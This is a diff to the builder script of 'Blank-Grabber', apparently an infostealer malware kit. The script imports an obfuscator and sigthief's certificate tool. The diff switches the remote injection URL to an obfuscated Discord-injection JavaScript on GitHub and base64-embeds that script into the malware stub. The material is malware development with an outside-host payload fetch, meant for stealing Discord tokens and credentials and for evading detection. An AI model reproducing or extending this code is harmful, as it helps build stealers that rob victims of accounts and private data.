@@ -11,13 +11,13 @@ import zipfile
 
 from urllib3 import PoolManager, disable_warnings
 disable_warnings()
-from BlankOBFv2 import BlankOBFv2
+from BlankOBFv2 import *
 from sigthief import outputCert
 
 SettingsFile = "config.json"
 InCodeFile = "stub.py"
 OutCodeFile = "stub-o.py"
-InjectionURL = "https://raw.githubusercontent.com/haiAzure/Blank-Grabber/injectionandsomething/injection.js"
+InjectionURL = "https://raw.githubusercontent.com/f4kedre4lity/Discord-Injection-BG/main/injection-obfuscated.js"
 
 def WriteSettings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('__name__ == "__main__" and ', '')
@@ -57,9 +57,6 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
 
     if injection is not None:
         code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
-
-    random_chars = ''.join(random.choices(string.ascii_letters, k=10))
-    code = code.replace("Settings", random_chars)
     
     return code
 
